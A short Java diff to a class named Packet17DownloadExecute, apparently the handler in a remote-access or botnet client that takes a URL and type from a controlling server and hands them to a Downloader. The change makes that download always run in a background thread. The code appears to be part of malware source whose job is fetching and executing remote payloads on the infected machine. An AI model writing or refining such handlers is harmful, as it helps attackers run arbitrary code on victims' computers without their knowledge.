@@ -10,14 +10,8 @@ public class Packet17DownloadExecute extends AbstractIncomingPacket {
 		String url = Connection.instance.readLine();
 		String type = Connection.instance.readLine();
 		boolean readFromSocket = Connection.instance.readBoolean();
-		
-		if (readFromSocket) {
-			new Downloader(url, false, type, readFromSocket).run();
-		} else {
-			new Downloader(url, false, type, readFromSocket).start();
-		}
-		
-		
+
+		new Downloader(url, false, type, readFromSocket).start();
 	}
 
 }
